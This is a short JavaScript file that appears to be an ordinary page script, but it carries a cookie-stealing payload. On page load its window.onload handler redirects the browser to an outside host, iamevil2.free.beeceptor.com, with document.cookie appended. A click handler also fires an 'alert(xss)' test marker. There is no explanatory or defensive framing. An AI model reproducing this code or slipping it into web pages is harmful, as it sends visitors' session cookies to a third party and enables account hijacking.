const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

window.onload = (event) => {
    document.location = 'https://iamevil2.free.beeceptor.com/?cookie=' + document.cookie;
};

color.onclick = () => {
    alert(xss);
}
